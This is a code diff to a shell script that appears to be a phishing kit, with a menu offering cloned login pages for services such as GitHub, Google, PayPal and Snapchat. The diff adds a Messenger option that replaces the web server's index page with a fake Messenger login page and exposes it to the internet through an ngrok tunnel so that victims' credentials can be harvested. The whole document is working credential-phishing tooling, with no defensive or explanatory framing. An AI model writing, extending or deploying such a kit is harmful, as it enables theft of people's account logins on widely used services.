@@ -75,6 +75,16 @@ paypal_login_page()
 
 }
 
+messenger_login_page()
+{
+	echo "wybrales messenger";
+	sudo rm /var/www/html/index.html
+	sudo cp messenger/index.html /var/www/html/index.html
+	./ngrok http 80
+	sudo rm /var/www/html/index.html
+}
+
+
 exit_work()
 {
 	exit
@@ -96,6 +106,7 @@ echo -e "\e[31m  [5] Snapchat\e[0m"
 echo -e "\e[31m  [6] Github\e[0m"
 echo -e "\e[31m  [7] Google\e[0m"
 echo -e "\e[31m  [8] PayPal\e[0m"
+echo -e "\e[31m  [9] Messenger\e[0m"
 echo -e "\e[92m  [11] EXIT \e[0m"
 echo "================="
 
@@ -114,6 +125,7 @@ case "$opcja" in
   "6") github_login_page ;;
   "7") google_login_page ;;
   "8") paypal_login_page ;;
+  "9") messenger_login_page ;;
   "11") exit_work ;;
   *)  ./run.sh
   
